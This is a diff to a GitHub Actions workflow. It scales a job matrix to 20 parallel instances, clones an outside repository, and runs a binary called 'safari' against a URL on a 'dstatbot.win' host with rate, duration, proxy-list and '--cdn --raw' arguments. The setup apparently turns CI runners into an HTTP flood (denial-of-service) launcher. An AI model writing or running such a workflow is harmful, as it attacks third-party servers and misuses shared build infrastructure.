@@ -13,7 +13,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
     
     steps:
     - name: Checkout code
@@ -21,9 +21,9 @@ jobs:
 
     - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
       run: |
-        sudo apt-get update && sudo apt-get install -y dos2unix
-        dos2unix safari proxies.txt
+        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
+        cd cuddly-octo-bassoon
         chmod +x safari
-        ./safari  https://c2.dstatbot.win/PlvBhjNM  700 10000 8000 proxy.txt --cdn --http
+        ./safari https://c1.dstatbot.win/9WKzuR36   700 10000 8000 proxies.txt --cdn --raw
       continue-on-error: true
-      
+    
